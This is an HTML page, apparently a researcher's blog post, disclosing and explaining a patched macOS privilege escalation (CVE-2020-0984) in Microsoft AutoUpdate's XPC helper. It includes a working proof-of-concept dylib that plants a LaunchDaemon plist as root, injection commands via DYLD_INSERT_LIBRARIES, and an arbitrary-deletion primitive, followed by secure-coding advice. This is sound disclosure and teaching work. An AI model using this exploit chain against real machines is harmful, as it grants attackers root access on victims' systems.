@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <meta name="author" content="Csaba Fitzl">
+    
+    
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Secure coding PrivilegedHelperTools - Part 3 - Incorrect client verification"/>
+<meta name="twitter:description" content="Microsoft AutoUpdate macOS privilege escalation vulnerability (CVE-2020-0984) Introduction This is the third post in my series which is trying to help Apple developers to avoid typical insecure coding practices. This one will highlight why XPC client hardening and proper verification is extremely important when we use XPC messaging on macOS between clients that run as a normal user and services that run as root. If this validation is not right, it opens up the possibility for an attacker to run privileged commands or worse case, achieve full privilege escalation on the system."/>
+
+    <meta property="og:title" content="Secure coding PrivilegedHelperTools - Part 3 - Incorrect client verification" />
+<meta property="og:description" content="Microsoft AutoUpdate macOS privilege escalation vulnerability (CVE-2020-0984) Introduction This is the third post in my series which is trying to help Apple developers to avoid typical insecure coding practices. This one will highlight why XPC client hardening and proper verification is extremely important when we use XPC messaging on macOS between clients that run as a normal user and services that run as root. If this validation is not right, it opens up the possibility for an attacker to run privileged commands or worse case, achieve full privilege escalation on the system." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://theevilbit.github.io/posts/secure_coding_privilegedhelpertools_part3/" />
+<meta property="article:published_time" content="2020-05-29T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-05-29T00:00:00+00:00" />
+
+
+    
+      <base href="https://theevilbit.github.io/posts/secure_coding_privilegedhelpertools_part3/">
+    
+    <title>
+  Secure coding PrivilegedHelperTools - Part 3 - Incorrect client verification · theevilbit blog
+</title>
+
+    
+      <link rel="canonical" href="https://theevilbit.github.io/posts/secure_coding_privilegedhelpertools_part3/">
+    
+
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" crossorigin="anonymous" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+
+    
+      
+      
+      <link rel="stylesheet" href="https://theevilbit.github.io/css/coder.min.28d751104f30c16da1aa1bb04015cbe662cacfe0d1b01af4f2240ad58580069c.css" integrity="sha256-KNdREE8wwW2hqhuwQBXL5mLKz&#43;DRsBr08iQK1YWABpw=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+
+    
+
+    
+    
+    <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://theevilbit.github.io/images/favicon-16x16.png" sizes="16x16">
+
+    <meta name="generator" content="Hugo 0.71.0" />
+  </head>
+
+  <body class=" ">
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="https://theevilbit.github.io/">
+      theevilbit blog
+    </a>
+    <input type="checkbox" id="menu-toggle" />
+    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
+    <ul class="navigation-list">
+      
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://theevilbit.github.io/categories/">Categories</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://theevilbit.github.io/posts/">Posts</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://theevilbit.github.io/tags/">Tags</a>
+          </li>
+        
+          <li class="navigation-item">
+            <a class="navigation-link" href="https://theevilbit.github.io/about/">About</a>
+          </li>
+        
+      
+      
+    </ul>
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">Secure coding PrivilegedHelperTools - Part 3 - Incorrect client verification</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fas fa-calendar"></i>
+              <time datetime='2020-05-29T00:00:00Z'>
+                May 29, 2020
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fas fa-clock"></i>
+              8 minutes read
+            </span>
+          </div>
+          <div class="categories">
+  <i class="fas fa-folder"></i>
+    <a href="https://theevilbit.github.io/categories/blog/">BLOG</a></div>
+
+          <div class="tags">
+  <i class="fas fa-tag"></i>
+    <a href="https://theevilbit.github.io/tags/macos/">macos</a>
+      <span class="separator">•</span>
+    <a href="https://theevilbit.github.io/tags/privilegedhelpertools/">privilegedhelpertools</a>
+      <span class="separator">•</span>
+    <a href="https://theevilbit.github.io/tags/xpc/">xpc</a>
+      <span class="separator">•</span>
+    <a href="https://theevilbit.github.io/tags/microsoft/">microsoft</a>
+      <span class="separator">•</span>
+    <a href="https://theevilbit.github.io/tags/lpe/">lpe</a>
+      <span class="separator">•</span>
+    <a href="https://theevilbit.github.io/tags/vulnerability/">vulnerability</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        <h1 id="microsoft-autoupdate-macos-privilege-escalation-vulnerability-cve-2020-0984">Microsoft AutoUpdate macOS privilege escalation vulnerability (CVE-2020-0984)</h1>
+<h2 id="introduction">Introduction</h2>
+<p>This is the third post in my series which is trying to help Apple developers to avoid typical insecure coding practices. This one will highlight why XPC client hardening and proper verification is extremely important when we use XPC messaging on macOS between clients that run as a normal user and services that run as root. If this validation is not right, it opens up the possibility for an attacker to run privileged commands or worse case, achieve full privilege escalation on the system.</p>
+<p>My earlier posts on the subject can be found here:</p>
+<p><a href="https://theevilbit.github.io/posts/secure_coding_privilegedhelpertools_part1/">Secure coding PrivilegedHelperTools - Part 1 - Why EvenBetterAuthorization is not enough?</a></p>
+<p><a href="https://theevilbit.github.io/posts/secure_coding_privilegedhelpertools_part2/">Secure coding PrivilegedHelperTools - Part 2 - Checking CS (CodeSigning) flags of the client</a></p>
+<h2 id="microsoft-autoupdate">Microsoft AutoUpdate</h2>
+<p>Microsoft uses a privileged helper tool to update MS Office applications on macOS, called Microsoft AutoUpdate (MSAU). Privileged helper tools run as root, and these services are typically installed to perform specific tasks for the client application that would require privilege elevation otherwise. Since the introduction of XPC, these tools mostly utilize XPC as an IPC (Inter Process Communication). Almost 2 years ago <a href="https://twitter.com/CodeColorist">(@CodeColorist)</a> already found a local privilege escalation in this software which was a weakness in its XPC connection verification and one of the offered functions, here is the link to his writeup: <a href="https://medium.com/0xcc/cve-2018-8412-ms-office-2016-for-mac-privilege-escalation-via-a-legcy-package-7fccdbf71d9b">CVE-2018–8412: MS Office 2016 for Mac Privilege Escalation via a Legacy Package</a>. Although Microsoft patched the vulnerable XPC function <code>installUpdateWithPackage</code>, they introduced new functionality in later versions, and as the client verification still wasn&rsquo;t fixed properly it introduced a new local privilege escalation vulnerability. This was patched by Microsoft at the 15th of April 2020, and assigned <a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0984">CVE-2020-0984</a>. Unfortunately this is common theme that vendors don&rsquo;t fix XPC vulnerabilities properly, and many time we can re-exploit them.</p>
+<h2 id="cve-2020-0984-exploitation">CVE-2020-0984 exploitation</h2>
+<p>When the MSAU privileged helper tool accepts a connection from a connecting client, it will perform the following signature check against it in its <code>shouldAcceptNewConnection</code> function:</p>
+<pre><code>&quot;(identifier \&quot;com.microsoft.autoupdate2\&quot; or identifier \&quot;com.microsoft.autoupdate.fba\&quot; or identifier \&quot;com.microsoft.autoupdate.cli\&quot;) and anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] and certificate leaf[field.1.2.840.113635.100.6.1.&quot; and certificate leaf[subject.OU] = UBF8T346G9
+</code></pre><p>This will check if:</p>
+<ol>
+<li>The connecting process is signed by Apple</li>
+<li>The connecting process is signed by Microsoft</li>
+<li>The connecting process is identified by one of the 3 bundle IDs we see above (<code>com.microsoft.autoupdate2</code>, <code>com.microsoft.autoupdate.fba</code>, <code>com.microsoft.autoupdate.cli</code>)</li>
+</ol>
+<p>This is done right, but there is one very important piece missing, which is ensuring that the client is hardened against injection attacks.  This can be done in 2 ways:</p>
+<ol>
+<li>
+<p>If we know that our clients are signed with hardened runtime or library validation above version X, we need to verify if the connecting client is at least at version X.</p>
+</li>
+<li>
+<p>Verify the code signing flags of the client, it has to be signed either with library validation or hardened runtime.</p>
+</li>
+</ol>
+<p>Additionally to these checks, the client mustn&rsquo;t hold the <code>com.apple.security.cs.disable-library-validation</code> entitlement, because that will allow 3rd party dylib injection. The <code>com.apple.security.get-task-allow</code> also must&rsquo;t be present as that would allow injection via Mach task ports.</p>
+<p>Lack of either of these verification means that if we can find an old version of the applications (with the same bundle ID), which doesn&rsquo;t have hardened runtime or library validation enabled, then we can use that, inject our dylib into it, and we will be able to talk to the privilege helper tool, completely bypassing the verification, because the old client will also satisfy the certification requirements. Missing hardened runtime is typical for applications from the Mojave period or before as hardened runtime wasn&rsquo;t mandatory and before Mojave it wasn&rsquo;t even available.</p>
+<p>After some search I found an old version of MSAU which satisfies our needs as it&rsquo;s not hardened and also has one of the acceptable bundle IDs. It can be downloaded from here: <a href="https://www.techspot.com/downloads/7052-microsoft-autoupdate.html">Microsoft AutoUpdate (MAU) 3.14 Download - TechSpot</a>. We can verify that with checking its code signing properties.</p>
+<pre><code>% codesign -dv Microsoft\ AutoUpdate.app
+Executable=/Users/user/Downloads/Microsoft AutoUpdate.app/Contents/MacOS/Microsoft AutoUpdate
+Identifier=com.microsoft.autoupdate2
+Format=app bundle with Mach-O thin (x86_64)
+CodeDirectory v=20200 size=5305 flags=0x0(none) hashes=160+3 location=embedded
+Signature size=8930
+Timestamp=2017. Nov 29. 13:05:09
+Info.plist entries=32
+TeamIdentifier=UBF8T346G9
+Sealed Resources version=2 rules=13 files=307
+Internal requirements count=1 size=188
+</code></pre><p>We can see that it has one of the bundle IDs we need <code>com.microsoft.autoupdate2</code> and also the same team ID the verification expects, <code>UBF8T346G9</code>.</p>
+<p>Now that we can talk to the helper tool, with some reverse engineering we can check if it has any promising function. Running <code>class-dump</code> against the binary <code>/Library/PrivilegedHelperTools/com.microsoft.autoupdate.helper</code> reveals that its functionality has been extended since 2018, it has more interfaces available through XPC. The <code>MAUHelperToolProtocol</code> describe the available functions we can call.</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#069;font-weight:bold">@protocol</span> <span style="color:#0a8;font-weight:bold">MAUHelperToolProtocol</span> <span style="color:#555">&lt;</span>NSObject<span style="color:#555">&gt;</span>
+<span style="color:#555">-</span> (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#99f">removeInstallLogFile</span>:(NSString <span style="color:#555">*</span>)arg1;
+- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">logString:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">atLevel:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">fromAppName:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span>;
+- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">removeClone:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg2</span>;
+- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">restoreCloneToAppInstallLocation:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg3</span>;
+- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">createCloneFromApp:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg3</span>;
+- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">installUpdateWithPackage:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withXMLPath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withAppPath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg4</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg5</span>;
+<span style="color:#069;font-weight:bold">@end</span>
+</code></pre></div><p>The <code>createCloneFromApp</code> sounded interesting, if we take a closer look, we will see that it simply copies the file passed into the location given without any further checks, and it uses the <code>[NSFileManager copyItemAtPath]</code> for this. We can use Hopper to decompile the function.</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">-(<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">createCloneFromApp:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withClonePath:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg4</span> {
+    var_48 <span style="color:#555">=</span> [arg2 <span style="color:#069;font-weight:bold">retain</span>];
+    r12 <span style="color:#555">=</span> [arg3 <span style="color:#069;font-weight:bold">retain</span>];
+    rax <span style="color:#555">=</span> [arg4 <span style="color:#069;font-weight:bold">retain</span>];
+    var_58 <span style="color:#555">=</span> r12;
+    var_40 <span style="color:#555">=</span> rax;
+    [<span style="color:#366">self</span> <span style="color:#99f">setErrorString</span>:<span style="color:#f60">0x0</span>];
+    rax <span style="color:#555">=</span> [NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;createCloneFromApp appPath: %@, clonePath: %@&#34;</span>, var_48, r12];
+    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
+    var_60 <span style="color:#555">=</span> rax;
+    [<span style="color:#366">self</span> <span style="color:#99f">logString</span>:rax <span style="color:#99f">atLevel</span>:<span style="color:#f60">0x5</span> <span style="color:#99f">fromAppName</span>:<span style="color:#c30">@&#34;Helper Tool&#34;</span>];
+    rax <span style="color:#555">=</span> [var_48 lastPathComponent];
+    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
+    r12 <span style="color:#555">=</span> [[var_58 <span style="color:#99f">stringByAppendingPathComponent</span>:rax] <span style="color:#069;font-weight:bold">retain</span>];
+    [rax <span style="color:#069;font-weight:bold">release</span>];
+    var_50 <span style="color:#555">=</span> r12;
+    r8 <span style="color:#555">=</span> r12;
+    rax <span style="color:#555">=</span> [NSString <span style="color:#99f">stringWithFormat</span>:<span style="color:#c30">@&#34;Performing copyItemAtPath: %@ toPath: %@&#34;</span>, var_48, r8];
+    r12 <span style="color:#555">=</span> var_48;
+    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
+    var_38 <span style="color:#555">=</span> <span style="color:#366">self</span>;
+    [<span style="color:#366">self</span> <span style="color:#99f">logString</span>:rax <span style="color:#99f">atLevel</span>:<span style="color:#f60">0x5</span> <span style="color:#99f">fromAppName</span>:<span style="color:#c30">@&#34;Helper Tool&#34;</span>];
+    [rax <span style="color:#069;font-weight:bold">release</span>];
+    r14 <span style="color:#555">=</span> var_40;
+    rax <span style="color:#555">=</span> [NSFileManager defaultManager];
+    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
+    r13 <span style="color:#555">=</span> rax;
+    [rax <span style="color:#99f">removeItemAtPath</span>:var_50 <span style="color:#99f">error</span>:<span style="color:#f60">0x0</span>];
+    var_78 <span style="color:#555">=</span> <span style="color:#f60">0x0</span>;
+    rbx <span style="color:#555">=</span> [r13 <span style="color:#99f">copyItemAtPath</span>:r12 <span style="color:#99f">toPath</span>:var_50 <span style="color:#99f">error</span>:r8];
+    r15 <span style="color:#555">=</span> [var_78 <span style="color:#069;font-weight:bold">retain</span>];
+</code></pre></div><p>If we can copy a file as root, with a source and destination we control, it&rsquo;s a trivial privilege escalation on macOS (and normally also on any other OS as well). Our plan will be to copy a <code>PLIST</code> file into <code>/Library/LaunchDaemons</code>, which will contain a command to run a script upon startup. Any script/application run from this directory will run as <code>root</code>. Our exploit is a short NSXPC client code, that will invoke the <code>createCloneFromApp</code> method of the XPC service. As it&rsquo;s a dylib, the code is placed into the constructor. The exploit will create a PLIST file in the location we need, and include a short shell script to create a file at <code>/Library/msauexp.txt</code>, where only root has write access.</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#099">#import &lt;Foundation/Foundation.h&gt;
+</span><span style="color:#099"></span>
+<span style="color:#069;font-weight:bold">static</span> NSString<span style="color:#555">*</span> kXPCHelperMachServiceName <span style="color:#555">=</span> <span style="color:#c30">@&#34;com.microsoft.autoupdate.helper&#34;</span>;
+
+<span style="color:#09f;font-style:italic">// The protocol that MSAU will vend as its XPC API.
+</span><span style="color:#09f;font-style:italic"></span><span style="color:#069;font-weight:bold">@protocol</span> <span style="color:#0a8;font-weight:bold">MAUHelperToolProtocol</span> <span style="color:#555">&lt;</span>NSObject<span style="color:#555">&gt;</span>
+<span style="color:#555">-</span> (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#99f">removeInstallLogFile</span>:(NSString <span style="color:#555">*</span>)arg1;
+- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">logString:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">atLevel:</span>(<span style="color:#078;font-weight:bold">int</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">fromAppName:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span>;
+- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">removeClone:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg2</span>;
+- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">restoreCloneToAppInstallLocation:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg3</span>;
+- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">createCloneFromApp:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg3</span>;
+- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">installUpdateWithPackage:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">withXMLPath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withAppPath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">withClonePath:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg4</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg5</span>;
+<span style="color:#069;font-weight:bold">@end</span>
+
+__attribute__((constructor))
+<span style="color:#069;font-weight:bold">static</span> <span style="color:#078;font-weight:bold">void</span> customConstructor(<span style="color:#078;font-weight:bold">int</span> argc, <span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span> <span style="color:#555">**</span>argv)
+{
+        
+		NSString<span style="color:#555">*</span> my_plist <span style="color:#555">=</span> <span style="color:#c30">@&#34;&lt;?xml version=</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">1.0</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30"> encoding=</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">UTF-8</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">?&gt;&#34;</span>
+		<span style="color:#c30">&#34;&lt;!DOCTYPE plist PUBLIC </span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">-//Apple Computer//DTD PLIST 1.0//EN</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30"> </span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">http://www.apple.com/DTDs/PropertyList-1.0.dtd</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">&gt;&#34;</span>
+		<span style="color:#c30">&#34;&lt;plist version=</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">1.0</span><span style="color:#c30;font-weight:bold">\&#34;</span><span style="color:#c30">&gt;&#34;</span>
+		<span style="color:#c30">&#34;&lt;dict&gt;&#34;</span>
+		<span style="color:#c30">&#34;  &lt;key&gt;Label&lt;/key&gt;&#34;</span>
+		<span style="color:#c30">&#34;  &lt;string&gt;com.sample.Load&lt;/string&gt;&#34;</span>
+		<span style="color:#c30">&#34;  &lt;key&gt;ProgramArguments&lt;/key&gt;&#34;</span>
+		<span style="color:#c30">&#34;  &lt;array&gt;&#34;</span>
+		<span style="color:#c30">&#34;	   &lt;string&gt;/bin/zsh&lt;/string&gt;&#34;</span>
+      <span style="color:#c30">&#34;      &lt;string&gt;-c&lt;/string&gt;&#34;</span>
+      <span style="color:#c30">&#34;      &lt;string&gt;touch /Library/msauexp.txt&lt;/string&gt;&#34;</span>
+		<span style="color:#c30">&#34;  &lt;/array&gt;&#34;</span>
+		<span style="color:#c30">&#34;	 &lt;key&gt;RunAtLoad&lt;/key&gt;&#34;</span>
+		<span style="color:#c30">&#34;	 &lt;true/&gt;&#34;</span>
+		<span style="color:#c30">&#34;&lt;/dict&gt;&#34;</span>
+		<span style="color:#c30">&#34;&lt;/plist&gt;&#34;</span>;
+		
+        [my_plist <span style="color:#99f">writeToFile</span>:<span style="color:#c30">@&#34;/tmp/com.sample.Load.plist&#34;</span> <span style="color:#99f">atomically</span>:<span style="color:#366">YES</span> <span style="color:#99f">encoding</span>:NSASCIIStringEncoding <span style="color:#99f">error</span>:<span style="color:#366">nil</span>];
+		
+        NSString<span style="color:#555">*</span>  _serviceName <span style="color:#555">=</span> kXPCHelperMachServiceName;
+
+        NSXPCConnection<span style="color:#555">*</span> _agentConnection <span style="color:#555">=</span> [[NSXPCConnection alloc] <span style="color:#99f">initWithMachServiceName</span>:_serviceName <span style="color:#99f">options</span>:<span style="color:#f60">4096</span>];
+        [_agentConnection <span style="color:#99f">setRemoteObjectInterface</span>:[NSXPCInterface <span style="color:#99f">interfaceWithProtocol</span>:@protocol(MAUHelperToolProtocol)]];
+        [_agentConnection resume];
+
+        <span style="color:#09f;font-style:italic">//        run user script as root/
+</span><span style="color:#09f;font-style:italic"></span>        [[_agentConnection <span style="color:#99f">remoteObjectProxyWithErrorHandler</span>:<span style="color:#555">^</span>(NSError<span style="color:#555">*</span> error) {
+            (<span style="color:#078;font-weight:bold">void</span>)error;
+            NSLog(<span style="color:#c30">@&#34;Connection Failure&#34;</span>);
+        }] <span style="color:#99f">createCloneFromApp</span>:<span style="color:#c30">@&#34;/tmp/com.sample.Load.plist&#34;</span> <span style="color:#99f">withClonePath</span>:<span style="color:#c30">@&#34;/Library/LaunchDaemons/&#34;</span> <span style="color:#99f">withReply</span>:<span style="color:#555">^</span>(NSString <span style="color:#555">*</span> err){
+            NSLog(<span style="color:#c30">@&#34;Reply, %@&#34;</span>, err);
+        }];
+        NSLog(<span style="color:#c30">@&#34;Done!&#34;</span>);
+
+    <span style="color:#069;font-weight:bold">return</span>;
+}
+</code></pre></div><p>Compile:</p>
+<pre><code>gcc -dynamiclib -framework Foundation mauexp.m -o mauexp.dylib
+</code></pre><p>To run our exploit, we need to inject it into the old MSAU application.</p>
+<pre><code>DYLD_INSERT_LIBRARIES=mauexp.dylib ~/Downloads/Microsoft\ AutoUpdate.app/Contents/MacOS/Microsoft\ AutoUpdate`
+</code></pre><p>Upon reboot our embedded script will be run, and eventually a file will be created at <code>/Library/mauresult.txt</code>.</p>
+<h2 id="removeclone---arbitrary-file-deletion-vulnerability">removeClone - Arbitrary file deletion vulnerability</h2>
+<p>As we can talk to the privilege helper tool, we can also invoke its other functions. The function <code>removeClone</code> offers an arbitrary file deletion. We can pass in a filename, and that will be deleted, without any further checks.</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#09f;font-style:italic">/* @class MAUHelperTool */</span>
+-(<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">removeClone:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">withReply:</span>(<span style="color:#078;font-weight:bold">void</span> <span style="color:#555">*</span>)<span style="color:#033">arg3</span> {
+    r13 <span style="color:#555">=</span> <span style="color:#366">self</span>;
+    r14 <span style="color:#555">=</span> [arg2 <span style="color:#069;font-weight:bold">retain</span>];
+    r15 <span style="color:#555">=</span> [arg3 <span style="color:#069;font-weight:bold">retain</span>];
+    [r13 <span style="color:#99f">setErrorString</span>:<span style="color:#f60">0x0</span>];
+    rax <span style="color:#555">=</span> [NSFileManager defaultManager];
+    rax <span style="color:#555">=</span> [rax <span style="color:#069;font-weight:bold">retain</span>];
+    r12 <span style="color:#555">=</span> rax;
+    <span style="color:#069;font-weight:bold">if</span> ([rax <span style="color:#99f">removeItemAtPath</span>:r14 <span style="color:#99f">error</span>:<span style="color:#f60">0x0</span>] <span style="color:#555">==</span> <span style="color:#f60">0x0</span>) {
+            [r13 <span style="color:#99f">setErrorString</span>:<span style="color:#c30">@&#34;Error removing clone&#34;</span>];
+    }
+    (<span style="color:#555">*</span>(r15 <span style="color:#555">+</span> <span style="color:#f60">0x10</span>))(r15, [r13 errorString]);
+    [r12 <span style="color:#069;font-weight:bold">release</span>];
+    [r15 <span style="color:#069;font-weight:bold">release</span>];
+    [r14 <span style="color:#069;font-weight:bold">release</span>];
+    <span style="color:#069;font-weight:bold">return</span>;
+}
+</code></pre></div><h2 id="secure-coding-best-practice">Secure coding best practice</h2>
+<p>As a closure, I would like to repeat (from my earlier post) what is the way of making an XPC connection secure.</p>
+<ol>
+<li>The client process verification in the <code>shouldAcceptNewConnection</code> call should verify the the following:</li>
+</ol>
+<p>a. The connecting process is signed by Apple
+b. The connecting process is signed by your team ID
+c. The connecting process is identified by your bundle ID
+d. The connecting process has a minimum software version, where the fix has been implemented or it&rsquo;s hardened against injection  attacks.</p>
+<p>For identifying the client at first place, the <code>audit_token</code> should be used instead of the PID, as the second is vulnerable to PID reuse attacks.</p>
+<ol start="2">
+<li>Beyond that the client which is allowed to connect has to be compiled with hardened runtime or library validation, without possessing the following entitlements:</li>
+</ol>
+<pre><code>com.apple.security.cs.allow-dyld-environment-variables
+com.apple.security.cs.disable-library-validation
+com.apple.security.get-task-allow
+</code></pre><p>as these entitlements would allow another process to inject code into the app, and thus allowing it to talk to the helper tool.</p>
+<p>Unfortunately these days most of the 3rd party PrivilegedHelperTools tend to be vulnerable due to Apple not providing a good practice for developers. Beyond that many times, even the fixes are not properly done, as it&rsquo;s very easy to miss any of the steps above. If you are a developer please spread the word, and if you are a security researcher, please also spread the word, and meanwhile profit via some bug bounties :)</p>
+
+      </div>
+
+      <footer>
+        
+
+
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    
+     © 2020
+    
+       · 
+      Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-151008930-1', 'auto');
+	
